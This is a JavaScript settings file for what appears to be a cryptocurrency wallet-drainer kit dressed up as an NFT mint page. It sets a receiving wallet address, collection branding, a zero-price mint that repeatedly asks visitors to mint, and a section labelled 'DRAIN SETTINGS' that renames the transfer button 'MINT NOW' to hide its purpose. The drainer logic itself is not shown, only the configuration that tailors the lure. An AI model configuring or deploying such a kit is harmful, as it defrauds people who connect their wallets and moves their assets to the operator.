/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "YOUR WALLET";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "?",
    date: "",
    socialMedia: {
        discord: "#",
        twitter: "#",
    },
    medias: {
        preview: "preview.gif",
        favicon: "icon.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "background.jpg", // Image for image type or video preview for video type (image before video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}

/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.0,
    totalSupply: 520099,
    minUnits: 1,
    
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const customStrings = {
    title: " {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "HOME",
    transferButton: "MINT NOW",
    dateString: "Melhor é o fim das coisas do que o princípio delas.", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/


